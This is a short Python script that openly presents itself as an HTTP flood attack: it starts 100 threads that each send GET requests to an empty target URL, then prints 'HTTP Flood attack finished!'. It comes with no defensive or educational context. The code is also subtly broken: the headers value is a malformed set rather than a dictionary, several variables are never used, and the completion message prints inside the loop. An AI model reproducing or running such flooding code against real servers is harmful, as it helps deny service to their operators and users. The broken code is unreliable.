import threading
import requests
import random

target_url = ""
concurrency = 100
requests_per_second = 100

def send_request():
    headers = {"User-Agent" "Mozilla/5.0"}
    response = requests.get(target_url, headers=headers)
    return response.status_code

for _ in range(concurrency):
    thread = threading.Thread(target=send_request)
    thread.start()

    print("HTTP Flood attack finished!")